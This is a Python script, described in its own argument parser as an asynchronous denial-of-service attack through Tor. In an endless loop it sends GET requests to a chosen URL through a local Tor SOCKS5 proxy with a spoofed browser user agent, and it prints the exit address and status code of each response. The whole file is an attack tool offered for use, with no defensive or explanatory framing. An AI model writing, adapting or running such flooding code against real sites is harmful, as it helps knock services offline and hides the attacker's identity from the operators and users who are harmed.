import asyncio

import aiohttp

from aiohttp_socks import ProxyType, ProxyConnector

import argparse

import re


PROTOCOL_PATTERN = '^(?:https?:\/\/)?(?:www\.)?'

URL = 'https://ident.me'

PROXY_HOST = 'localhost'

PROXY_PORT = 9050


async def main(url, proxy_host, proxy_port):
    while True:
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=proxy_host,
            port=proxy_port,
            rdns=True
        )

        session = aiohttp.ClientSession(connector=connector)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
        }

        async with session.get(url, headers=headers) as response:
            print(f'Request to {re.sub(PROTOCOL_PATTERN, "", url)} made through {await response.text()} has a {response.status} status code')

        await session.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Asynchronous Denial-of-service attack through TOR.')

    parser.add_argument(
        '--url',
        default=URL,
        type=str
    )
    parser.add_argument(
        '--proxy_host',
        default=PROXY_HOST,
        type=str
    )
    parser.add_argument(
        '--proxy_port',
        default=PROXY_PORT,
        type=int
    )

    args = parser.parse_args()

    loop = asyncio.get_event_loop()

    loop.create_task(main(args.url, args.proxy_host, args.proxy_port))

    loop.run_forever()
